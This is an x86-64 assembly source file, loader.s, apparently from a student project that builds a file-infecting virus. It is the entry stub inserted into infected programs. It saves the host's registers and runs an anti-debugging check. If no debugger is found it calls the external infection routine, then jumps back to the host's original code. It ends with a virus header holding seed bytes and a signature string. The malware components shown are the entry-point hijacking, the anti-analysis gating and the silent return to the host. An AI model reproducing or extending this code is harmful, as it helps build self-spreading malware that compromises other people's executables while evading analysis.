; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    loader.s                                           :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
;    Updated: 2020/04/07 20:42:22 by ichkamo          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

section .text
	global loader_entry
	global jump_back_to_client
	global loader_exit
	global virus_header_struct

extern virus
extern detect_spy

;----------------------------------; backup all swappable registers
;                                    (all but rax, rsp, rbp)
loader_entry:
	push rcx                   ; backup rcx
	push rdx                   ; backup rdx
	push rbx                   ; backup rbx
	push rsi                   ; backup rsi
	push rdi                   ; backup rdi
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15

;----------------------------------; run anti debug
	call detect_spy
	test rax, rax
	jnz return_to_client

;----------------------------------; launch infection routines
	call virus
	; call virus relative addr TODO

;----------------------------------; restore state, return to client code
return_to_client:

;----------------------------------; restore registers
	pop r15                    ; restore r15
	pop r14                    ; restore r14
	pop r13                    ; restore r13
	pop r12                    ; restore r12
	pop r11                    ; restore r11
	pop r10                    ; restore r10
	pop r9                     ; restore r9
	pop r8                     ; restore r8
	pop rdi                    ; restore rdi
	pop rsi                    ; restore rsi
	pop rbx                    ; restore rbx
	pop rdx                    ; restore rdx
	pop rcx                    ; restore rcx

jump_back_to_client:
	jmp 0xffffffff             ; jump back to entry (done by virus)
loader_exit:

virus_header_struct:
	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
